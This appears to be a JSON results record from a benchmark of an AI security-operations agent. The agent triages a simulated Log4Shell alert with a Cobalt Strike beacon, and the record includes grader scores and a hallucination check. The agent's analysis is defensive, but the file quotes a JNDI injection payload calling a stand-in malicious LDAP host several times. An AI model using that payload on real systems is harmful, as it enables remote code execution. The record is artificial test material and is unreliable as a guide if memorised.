@@ -1,0 +1,371 @@
+{
+  "test_case_id": "A15",
+  "scenario": "Log4j 漏洞利用尝试并连接 C2",
+  "difficulty": "medium",
+  "is_positive": true,
+  "expected_severity": "critical",
+  "status": "completed",
+  "agent_output": {
+    "alert_id": "A15",
+    "judgment": {
+      "severity": "critical",
+      "attack_type": "Log4Shell Exploitation & C2 Beacon",
+      "confidence": 0.95,
+      "summary": "Confirmed successful Log4Shell exploitation on production Java server followed by Cobalt Strike beacon communication.",
+      "evidence_chain": [
+        "WAF alert A15 detected JNDI injection payload ${jndi:ldap://malicious.ldap/a} targeting 10.0.2.88 (query_alert_detail)",
+        "Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback (query_alert_detail)",
+        "Asset 10.0.2.88 is a high-level production Java system in DMZ zone (query_asset_info)",
+        "Threat intel confirms malicious.ldap is a known C2/exploit domain (query_threat_intel)",
+        "Threat intel confirms 192.0.2.200 is an active Log4Shell scanner (query_threat_intel)",
+        "Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after (query_related_alerts)"
+      ],
+      "iocs": [
+        {
+          "type": "ip",
+          "value": "192.0.2.200",
+          "malicious": true,
+          "context": "Source of Log4Shell attack"
+        },
+        {
+          "type": "domain",
+          "value": "malicious.ldap",
+          "malicious": true,
+          "context": "Malicious LDAP callback server"
+        },
+        {
+          "type": "ip",
+          "value": "198.51.100.44",
+          "malicious": true,
+          "context": "Suspected C2 server based on Cobalt Strike beacon"
+        }
+      ]
+    },
+    "remediation": [
+      "Immediately isolate host 10.0.2.88 from the network to prevent lateral movement.",
+      "Block IP 192.0.2.200, domain malicious.ldap, and IP 198.51.100.44 at perimeter firewall and WAF.",
+      "Apply emergency patch for Log4j CVE-2021-44228 on all affected Java applications.",
+      "Conduct forensic analysis on 10.0.2.88 to identify installed payloads and persistence mechanisms indicated by Cobalt Strike beacon.",
+      "Reset credentials for service accounts associated with java-app-02."
+    ],
+    "metadata": {
+      "tools_called": [
+        "query_alert_detail",
+        "query_asset_info",
+        "query_threat_intel",
+        "query_related_alerts"
+      ]
+    }
+  },
+  "code_graders": {
+    "tools_called_minimum": {
+      "passed": true,
+      "reason": "required tools present",
+      "expected": [
+        "query_alert_detail",
+        "query_threat_intel",
+        "query_related_alerts"
+      ],
+      "actual": [
+        "query_alert_detail",
+        "query_asset_info",
+        "query_threat_intel",
+        "query_related_alerts"
+      ]
+    },
+    "output_schema": {
+      "passed": true,
+      "reason": "required fields present",
+      "expected": null,
+      "actual": null
+    },
+    "severity_enum": {
+      "passed": true,
+      "reason": "severity is valid",
+      "expected": [
+        "critical",
+        "false_positive",
+        "high",
+        "low",
+        "medium"
+      ],
+      "actual": "critical"
+    },
+    "severity_match": {
+      "passed": true,
+      "reason": "severity matches",
+      "expected": "critical",
+      "actual": "critical"
+    },
+    "confidence_range": {
+      "passed": true,
+      "reason": "confidence in range",
+      "expected": "0..1",
+      "actual": 0.95
+    },
+    "remediation_not_empty": {
+      "passed": true,
+      "reason": "remediation actionable",
+      "expected": "at least one item >=10 chars",
+      "actual": [
+        "Immediately isolate host 10.0.2.88 from the network to prevent lateral movement.",
+        "Block IP 192.0.2.200, domain malicious.ldap, and IP 198.51.100.44 at perimeter firewall and WAF.",
+        "Apply emergency patch for Log4j CVE-2021-44228 on all affected Java applications.",
+        "Conduct forensic analysis on 10.0.2.88 to identify installed payloads and persistence mechanisms indicated by Cobalt Strike beacon.",
+        "Reset credentials for service accounts associated with java-app-02."
+      ]
+    }
+  },
+  "quality_scores": {
+    "severity_rationality": {
+      "score": 5,
+      "reason": "The agent's judgment of 'critical' severity is fully supported by the evidence chain. The input data confirms a successful Log4Shell exploitation on a high-value production asset (10.0.2.88), verified by raw logs showing JNDI injection and callback to a known malicious domain (malicious.ldap). Furthermore, threat intelligence validates the source IP as an active scanner and the destination domain as a C2 server. Crucially, a related alert confirms immediate post-exploitation activity via a Cobalt Strike beacon, indicating active compromise rather than just an attempt.",
+      "evidence_quotes": [
+        "Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback",
+        "Asset 10.0.2.88 is a high-level production Java system in DMZ zone",
+        "Threat intel confirms malicious.ldap is a known C2/exploit domain",
+        "Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after"
+      ]
+    },
+    "remediation_actionability": {
+      "score": 5,
+      "reason": "处置建议非常具体、可执行且逻辑清晰。建议按优先级排列：首先隔离受感染主机（10.0.2.88）以阻断横向移动，其次在防火墙/WAF层面阻断所有已知IOC（攻击源IP、C2域名、C2 IP），随后进行紧急补丁修复和凭证重置，最后开展取证分析。这些措施直接对应证据链中确认的Log4Shell利用成功及Cobalt Strike信标通信事实。",
+      "evidence_quotes": [
+        "Immediately isolate host 10.0.2.88 from the network to prevent lateral movement.",
+        "Block IP 192.0.2.200, domain malicious.ldap, and IP 198.51.100.44 at perimeter firewall and WAF.",
+        "Apply emergency patch for Log4j CVE-2021-44228 on all affected Java applications.",
+        "Conduct forensic analysis on 10.0.2.88 to identify installed payloads and persistence mechanisms indicated by Cobalt Strike beacon.",
+        "Reset credentials for service accounts associated with java-app-02."
+      ]
+    },
+    "evidence_completeness": {
+      "score": 5,
+      "reason": "证据链完整覆盖了攻击的关键阶段：1. 初始入侵（WAF 检测到 JNDI 注入 payload）；2. 利用成功（日志确认主机连接恶意 LDAP 服务器）；3. 资产价值（生产环境 Java 系统）；4. IOC 验证（威胁情报确认源 IP 为扫描器、域名及 C2 服务器均为恶意）；5. 后续行为（相关告警显示 Cobalt Strike Beacon 通信）。所有关键 IOC 与行为特征均有明确的 API 响应数据支撑，逻辑闭环。",
+      "evidence_quotes": [
+        "Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback (query_alert_detail)",
+        "Threat intel confirms malicious.ldap is a known C2/exploit domain (query_threat_intel)",
+        "Threat intel confirms 192.0.2.200 is an active Log4Shell scanner (query_threat_intel)",
+        "Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after (query_related_alerts)"
+      ]
+    }
+  },
+  "hallucination": {
+    "total_statements": 6,
+    "verifiable": 6,
+    "hallucinations": 0,
+    "uncertain": 0,
+    "details": [
+      {
+        "statement": "WAF alert A15 detected JNDI injection payload ${jndi:ldap://malicious.ldap/a} targeting 10.0.2.88",
+        "verdict": "verifiable",
+        "reason": "Confirmed by mock_api_responses query_alert_detail_A15 which shows source_ip 192.0.2.200, destination_ip 10.0.2.88, and raw_log containing the specific payload string."
+      },
+      {
+        "statement": "Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback",
+        "verdict": "verifiable",
+        "reason": "The raw_log field in query_alert_detail_A15 explicitly states: 'Later host 10.0.2.88 connected to malicious.ldap:1389'."
+      },
+      {
+        "statement": "Asset 10.0.2.88 is a high-level production Java system in DMZ zone",
+        "verdict": "verifiable",
+        "reason": "query_asset_info_10.0.2.88 returns asset_level as 'high', business_system includes 'Java', and network_zone as '生产-DMZ' (Production-DMZ)."
+      },
+      {
+        "statement": "Threat intel confirms malicious.ldap is a known C2/exploit domain",
+        "verdict": "verifiable",
+        "reason": "query_threat_intel_domain_malicious.ldap shows is_malicious: true, threat_tags include 'C2' and 'exploit', and raw_intel describes it as a malicious LDAP server for Log4Shell."
+      },
+      {
+        "statement": "Threat intel confirms 192.0.2.200 is an active Log4Shell scanner",
+        "verdict": "verifiable",
+        "reason": "query_threat_intel_ip_192.0.2.200 shows is_malicious: true and raw_intel states 'IP actively scanning for Log4Shell'. It also matches the source_ip in the alert details."
+      },
+      {
+        "statement": "Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after",
+        "verdict": "verifiable",
+        "reason": "query_related_alerts_10.0.2.88_48h contains alert A15-REL-01 with summary 'Host 10.0.2.88 made outbound connection to 198.51.100.44:4444, signature matches Cobalt Strike beacon' and timestamp 05:16:00Z (shortly after A15 at 05:15:02Z)."
+      }
+    ]
+  },
+  "calls": [
+    {
+      "label": "agent",
+      "parsed": {
+        "alert_id": "A15",
+        "judgment": {
+          "severity": "critical",
+          "attack_type": "Log4Shell Exploitation & C2 Beacon",
+          "confidence": 0.95,
+          "summary": "Confirmed successful Log4Shell exploitation on production Java server followed by Cobalt Strike beacon communication.",
+          "evidence_chain": [
+            "WAF alert A15 detected JNDI injection payload ${jndi:ldap://malicious.ldap/a} targeting 10.0.2.88 (query_alert_detail)",
+            "Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback (query_alert_detail)",
+            "Asset 10.0.2.88 is a high-level production Java system in DMZ zone (query_asset_info)",
+            "Threat intel confirms malicious.ldap is a known C2/exploit domain (query_threat_intel)",
+            "Threat intel confirms 192.0.2.200 is an active Log4Shell scanner (query_threat_intel)",
+            "Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after (query_related_alerts)"
+          ],
+          "iocs": [
+            {
+              "type": "ip",
+              "value": "192.0.2.200",
+              "malicious": true,
+              "context": "Source of Log4Shell attack"
+            },
+            {
+              "type": "domain",
+              "value": "malicious.ldap",
+              "malicious": true,
+              "context": "Malicious LDAP callback server"
+            },
+            {
+              "type": "ip",
+              "value": "198.51.100.44",
+              "malicious": true,
+              "context": "Suspected C2 server based on Cobalt Strike beacon"
+            }
+          ]
+        },
+        "remediation": [
+          "Immediately isolate host 10.0.2.88 from the network to prevent lateral movement.",
+          "Block IP 192.0.2.200, domain malicious.ldap, and IP 198.51.100.44 at perimeter firewall and WAF.",
+          "Apply emergency patch for Log4j CVE-2021-44228 on all affected Java applications.",
+          "Conduct forensic analysis on 10.0.2.88 to identify installed payloads and persistence mechanisms indicated by Cobalt Strike beacon.",
+          "Reset credentials for service accounts associated with java-app-02."
+        ],
+        "metadata": {
+          "tools_called": [
+            "query_alert_detail",
+            "query_asset_info",
+            "query_threat_intel",
+            "query_related_alerts"
+          ]
+        }
+      },
+      "raw_text": "{\n  \"alert_id\": \"A15\",\n  \"judgment\": {\n    \"severity\": \"critical\",\n    \"attack_type\": \"Log4Shell Exploitation & C2 Beacon\",\n    \"confidence\": 0.95,\n    \"summary\": \"Confirmed successful Log4Shell exploitation on production Java server followed by Cobalt Strike beacon communication.\",\n    \"evidence_chain\": [\n      \"WAF alert A15 detected JNDI injection payload ${jndi:ldap://malicious.ldap/a} targeting 10.0.2.88 (query_alert_detail)\",\n      \"Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback (query_alert_detail)\",\n      \"Asset 10.0.2.88 is a high-level production Java system in DMZ zone (query_asset_info)\",\n      \"Threat intel confirms malicious.ldap is a known C2/exploit domain (query_threat_intel)\",\n      \"Threat intel confirms 192.0.2.200 is an active Log4Shell scanner (query_threat_intel)\",\n      \"Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after (query_related_alerts)\"\n    ],\n    \"iocs\": [\n      {\n        \"type\": \"ip\",\n        \"value\": \"192.0.2.200\",\n        \"malicious\": true,\n        \"context\": \"Source of Log4Shell attack\"\n      },\n      {\n        \"type\": \"domain\",\n        \"value\": \"malicious.ldap\",\n        \"malicious\": true,\n        \"context\": \"Malicious LDAP callback server\"\n      },\n      {\n        \"type\": \"ip\",\n        \"value\": \"198.51.100.44\",\n        \"malicious\": true,\n        \"context\": \"Suspected C2 server based on Cobalt Strike beacon\"\n      }\n    ]\n  },\n  \"remediation\": [\n    \"Immediately isolate host 10.0.2.88 from the network to prevent lateral movement.\",\n    \"Block IP 192.0.2.200, domain malicious.ldap, and IP 198.51.100.44 at perimeter firewall and WAF.\",\n    \"Apply emergency patch for Log4j CVE-2021-44228 on all affected Java applications.\",\n    \"Conduct forensic analysis on 10.0.2.88 to identify installed payloads and persistence mechanisms indicated by Cobalt Strike beacon.\",\n    \"Reset credentials for service accounts associated with java-app-02.\"\n  ],\n  \"metadata\": {\n    \"tools_called\": [\n      \"query_alert_detail\",\n      \"query_asset_info\",\n      \"query_threat_intel\",\n      \"query_related_alerts\"\n    ]\n  }\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1359,
+      "output_tokens": 3376,
+      "latency_ms": 37393,
+      "attempts": 1
+    },
+    {
+      "label": "severity_rationality",
+      "parsed": {
+        "score": 5,
+        "reason": "The agent's judgment of 'critical' severity is fully supported by the evidence chain. The input data confirms a successful Log4Shell exploitation on a high-value production asset (10.0.2.88), verified by raw logs showing JNDI injection and callback to a known malicious domain (malicious.ldap). Furthermore, threat intelligence validates the source IP as an active scanner and the destination domain as a C2 server. Crucially, a related alert confirms immediate post-exploitation activity via a Cobalt Strike beacon, indicating active compromise rather than just an attempt.",
+        "evidence_quotes": [
+          "Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback",
+          "Asset 10.0.2.88 is a high-level production Java system in DMZ zone",
+          "Threat intel confirms malicious.ldap is a known C2/exploit domain",
+          "Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after"
+        ]
+      },
+      "raw_text": "{\n  \"score\": 5,\n  \"reason\": \"The agent's judgment of 'critical' severity is fully supported by the evidence chain. The input data confirms a successful Log4Shell exploitation on a high-value production asset (10.0.2.88), verified by raw logs showing JNDI injection and callback to a known malicious domain (malicious.ldap). Furthermore, threat intelligence validates the source IP as an active scanner and the destination domain as a C2 server. Crucially, a related alert confirms immediate post-exploitation activity via a Cobalt Strike beacon, indicating active compromise rather than just an attempt.\",\n  \"evidence_quotes\": [\n    \"Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback\",\n    \"Asset 10.0.2.88 is a high-level production Java system in DMZ zone\",\n    \"Threat intel confirms malicious.ldap is a known C2/exploit domain\",\n    \"Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after\"\n  ]\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1854,
+      "output_tokens": 268,
+      "latency_ms": 4372,
+      "attempts": 1
+    },
+    {
+      "label": "remediation_actionability",
+      "parsed": {
+        "score": 5,
+        "reason": "处置建议非常具体、可执行且逻辑清晰。建议按优先级排列：首先隔离受感染主机（10.0.2.88）以阻断横向移动，其次在防火墙/WAF层面阻断所有已知IOC（攻击源IP、C2域名、C2 IP），随后进行紧急补丁修复和凭证重置，最后开展取证分析。这些措施直接对应证据链中确认的Log4Shell利用成功及Cobalt Strike信标通信事实。",
+        "evidence_quotes": [
+          "Immediately isolate host 10.0.2.88 from the network to prevent lateral movement.",
+          "Block IP 192.0.2.200, domain malicious.ldap, and IP 198.51.100.44 at perimeter firewall and WAF.",
+          "Apply emergency patch for Log4j CVE-2021-44228 on all affected Java applications.",
+          "Conduct forensic analysis on 10.0.2.88 to identify installed payloads and persistence mechanisms indicated by Cobalt Strike beacon.",
+          "Reset credentials for service accounts associated with java-app-02."
+        ]
+      },
+      "raw_text": "{\n  \"score\": 5,\n  \"reason\": \"处置建议非常具体、可执行且逻辑清晰。建议按优先级排列：首先隔离受感染主机（10.0.2.88）以阻断横向移动，其次在防火墙/WAF层面阻断所有已知IOC（攻击源IP、C2域名、C2 IP），随后进行紧急补丁修复和凭证重置，最后开展取证分析。这些措施直接对应证据链中确认的Log4Shell利用成功及Cobalt Strike信标通信事实。\",\n  \"evidence_quotes\": [\n    \"Immediately isolate host 10.0.2.88 from the network to prevent lateral movement.\",\n    \"Block IP 192.0.2.200, domain malicious.ldap, and IP 198.51.100.44 at perimeter firewall and WAF.\",\n    \"Apply emergency patch for Log4j CVE-2021-44228 on all affected Java applications.\",\n    \"Conduct forensic analysis on 10.0.2.88 to identify installed payloads and persistence mechanisms indicated by Cobalt Strike beacon.\",\n    \"Reset credentials for service accounts associated with java-app-02.\"\n  ]\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1857,
+      "output_tokens": 273,
+      "latency_ms": 3243,
+      "attempts": 1
+    },
+    {
+      "label": "evidence_completeness",
+      "parsed": {
+        "score": 5,
+        "reason": "证据链完整覆盖了攻击的关键阶段：1. 初始入侵（WAF 检测到 JNDI 注入 payload）；2. 利用成功（日志确认主机连接恶意 LDAP 服务器）；3. 资产价值（生产环境 Java 系统）；4. IOC 验证（威胁情报确认源 IP 为扫描器、域名及 C2 服务器均为恶意）；5. 后续行为（相关告警显示 Cobalt Strike Beacon 通信）。所有关键 IOC 与行为特征均有明确的 API 响应数据支撑，逻辑闭环。",
+        "evidence_quotes": [
+          "Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback (query_alert_detail)",
+          "Threat intel confirms malicious.ldap is a known C2/exploit domain (query_threat_intel)",
+          "Threat intel confirms 192.0.2.200 is an active Log4Shell scanner (query_threat_intel)",
+          "Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after (query_related_alerts)"
+        ]
+      },
+      "raw_text": "{\n  \"score\": 5,\n  \"reason\": \"证据链完整覆盖了攻击的关键阶段：1. 初始入侵（WAF 检测到 JNDI 注入 payload）；2. 利用成功（日志确认主机连接恶意 LDAP 服务器）；3. 资产价值（生产环境 Java 系统）；4. IOC 验证（威胁情报确认源 IP 为扫描器、域名及 C2 服务器均为恶意）；5. 后续行为（相关告警显示 Cobalt Strike Beacon 通信）。所有关键 IOC 与行为特征均有明确的 API 响应数据支撑，逻辑闭环。\",\n  \"evidence_quotes\": [\n    \"Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback (query_alert_detail)\",\n    \"Threat intel confirms malicious.ldap is a known C2/exploit domain (query_threat_intel)\",\n    \"Threat intel confirms 192.0.2.200 is an active Log4Shell scanner (query_threat_intel)\",\n    \"Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after (query_related_alerts)\"\n  ]\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1857,
+      "output_tokens": 290,
+      "latency_ms": 3247,
+      "attempts": 1
+    },
+    {
+      "label": "hallucination_check",
+      "parsed": {
+        "total_statements": 6,
+        "verifiable": 6,
+        "hallucinations": 0,
+        "uncertain": 0,
+        "details": [
+          {
+            "statement": "WAF alert A15 detected JNDI injection payload ${jndi:ldap://malicious.ldap/a} targeting 10.0.2.88",
+            "verdict": "verifiable",
+            "reason": "Confirmed by mock_api_responses query_alert_detail_A15 which shows source_ip 192.0.2.200, destination_ip 10.0.2.88, and raw_log containing the specific payload string."
+          },
+          {
+            "statement": "Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback",
+            "verdict": "verifiable",
+            "reason": "The raw_log field in query_alert_detail_A15 explicitly states: 'Later host 10.0.2.88 connected to malicious.ldap:1389'."
+          },
+          {
+            "statement": "Asset 10.0.2.88 is a high-level production Java system in DMZ zone",
+            "verdict": "verifiable",
+            "reason": "query_asset_info_10.0.2.88 returns asset_level as 'high', business_system includes 'Java', and network_zone as '生产-DMZ' (Production-DMZ)."
+          },
+          {
+            "statement": "Threat intel confirms malicious.ldap is a known C2/exploit domain",
+            "verdict": "verifiable",
+            "reason": "query_threat_intel_domain_malicious.ldap shows is_malicious: true, threat_tags include 'C2' and 'exploit', and raw_intel describes it as a malicious LDAP server for Log4Shell."
+          },
+          {
+            "statement": "Threat intel confirms 192.0.2.200 is an active Log4Shell scanner",
+            "verdict": "verifiable",
+            "reason": "query_threat_intel_ip_192.0.2.200 shows is_malicious: true and raw_intel states 'IP actively scanning for Log4Shell'. It also matches the source_ip in the alert details."
+          },
+          {
+            "statement": "Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after",
+            "verdict": "verifiable",
+            "reason": "query_related_alerts_10.0.2.88_48h contains alert A15-REL-01 with summary 'Host 10.0.2.88 made outbound connection to 198.51.100.44:4444, signature matches Cobalt Strike beacon' and timestamp 05:16:00Z (shortly after A15 at 05:15:02Z)."
+          }
+        ]
+      },
+      "raw_text": "{\n  \"total_statements\": 6,\n  \"verifiable\": 6,\n  \"hallucinations\": 0,\n  \"uncertain\": 0,\n  \"details\": [\n    {\n      \"statement\": \"WAF alert A15 detected JNDI injection payload ${jndi:ldap://malicious.ldap/a} targeting 10.0.2.88\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"Confirmed by mock_api_responses query_alert_detail_A15 which shows source_ip 192.0.2.200, destination_ip 10.0.2.88, and raw_log containing the specific payload string.\"\n    },\n    {\n      \"statement\": \"Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"The raw_log field in query_alert_detail_A15 explicitly states: 'Later host 10.0.2.88 connected to malicious.ldap:1389'.\"\n    },\n    {\n      \"statement\": \"Asset 10.0.2.88 is a high-level production Java system in DMZ zone\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"query_asset_info_10.0.2.88 returns asset_level as 'high', business_system includes 'Java', and network_zone as '生产-DMZ' (Production-DMZ).\"\n    },\n    {\n      \"statement\": \"Threat intel confirms malicious.ldap is a known C2/exploit domain\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"query_threat_intel_domain_malicious.ldap shows is_malicious: true, threat_tags include 'C2' and 'exploit', and raw_intel describes it as a malicious LDAP server for Log4Shell.\"\n    },\n    {\n      \"statement\": \"Threat intel confirms 192.0.2.200 is an active Log4Shell scanner\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"query_threat_intel_ip_192.0.2.200 shows is_malicious: true and raw_intel states 'IP actively scanning for Log4Shell'. It also matches the source_ip in the alert details.\"\n    },\n    {\n      \"statement\": \"Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"query_related_alerts_10.0.2.88_48h contains alert A15-REL-01 with summary 'Host 10.0.2.88 made outbound connection to 198.51.100.44:4444, signature matches Cobalt Strike beacon' and timestamp 05:16:00Z (shortly after A15 at 05:15:02Z).\"\n    }\n  ]\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1888,
+      "output_tokens": 722,
+      "latency_ms": 8431,
+      "attempts": 1
+    }
+  ],
+  "overall_pass": true,
+  "error_type": null,
+  "error_message": null
+}
